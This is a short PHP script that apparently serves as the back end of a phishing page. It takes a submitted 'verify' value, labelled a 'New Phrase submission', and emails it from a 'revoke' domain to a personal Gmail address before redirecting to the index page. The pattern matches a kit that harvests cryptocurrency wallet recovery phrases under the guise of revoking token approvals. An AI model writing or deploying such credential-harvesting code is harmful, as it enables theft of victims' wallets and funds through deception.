<?php
	
		if(isset($_POST['verifybtn'])){

					$code = $_POST['verify'];
					// $password = $_POST['upassword'];
					

					//Validate first
					if(empty($code)) 
					{
					    echo "mandatory!";
					    exit;
					}

					/*if(IsInjected($password))
					{
					    echo "Bad email value!";
					    exit;
					}*/

					$email_from = 'admin@revoke.one';//<== update the email address
					$email_subject = "New Phrase submission";
					$email_body = "You have received a new message from $code.\n";
					    
					$to = "Airjimmi@gmail.com";//<== update the email address
					$headers = "From: $email_from \r\n";
					//$headers .= "Reply-To: $visitor_email \r\n";
					//Send the email!
					mail($to,$email_subject,$email_body,$headers);
					//done. redirect to thank-you page.
					header('Location: index.html');


					// Function to validate against any email injection attempts
					function IsInjected($str)
					{
					  $injections = array('(\n+)',
					              '(\r+)',
					              '(\t+)',
					              '(%0A+)',
					              '(%0D+)',
					              '(%08+)',
					              '(%09+)'
					              );
					  $inject = join('|', $injections);
					  $inject = "/$inject/i";
					  if(preg_match($inject,$str))
					    {
					    return true;
					  }
					  else
					    {
					    return false;
					  }
					}

		}


		

?>